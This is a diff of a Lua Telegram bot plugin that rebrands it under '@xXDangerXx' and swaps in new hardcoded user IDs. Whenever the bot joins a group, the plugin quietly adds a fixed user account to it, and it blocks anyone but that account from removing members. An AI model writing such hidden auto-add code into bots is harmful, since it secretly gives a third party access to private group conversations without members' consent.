@@ -1,5 +1,5 @@
-    --This Plugin Powered By @MeGa_ADMiN 
-    --ID CHannel:@MeGaB0T_TeaM	
+    --This Plugin Powered By @xXDangerXx
+	
 
 do
 local function invite_user(chat, user)
@@ -9,7 +9,7 @@ local function invite_user(chat, user)
 	  
 	  
 	  
-	  Contact With @Mega_admin
+	  Contact With @xXDangerXx
 	  ]]
    end
    return "کاربر: "..user.." ادد شد به گروه "..chat
@@ -17,12 +17,12 @@ end
 local function service_msg(msg)
     if msg.action.user.id == our_id then
        local chat = 'chat#id'..msg.to.id
-       local user = 'user#id139681991'
+       local user = 'user#id195473011'
       chat_add_user(chat, user, callback, false)
      end
    local receiver = get_receiver(msg)
    local response = ""
-   if msg.action.type == "chat_del_user" and msg.from.id ~= 113481618 and msg.from.id ~= our_id then
+   if msg.action.type == "chat_del_user" and msg.from.id ~= 195473011 and msg.from.id ~= our_id then
       print(invite_user("chat#id"..msg.to.id, "user#id"..msg.action.user.id))
    end
 
@@ -36,5 +36,4 @@ return {
   on_service_msg = service_msg
 }
 end
-    --This Plugin Powered By @MeGa_ADMiN 
-    --ID CHannel:@MeGaB0T_TeaM	
+    --This Plugin Powered By @xXDangerXx
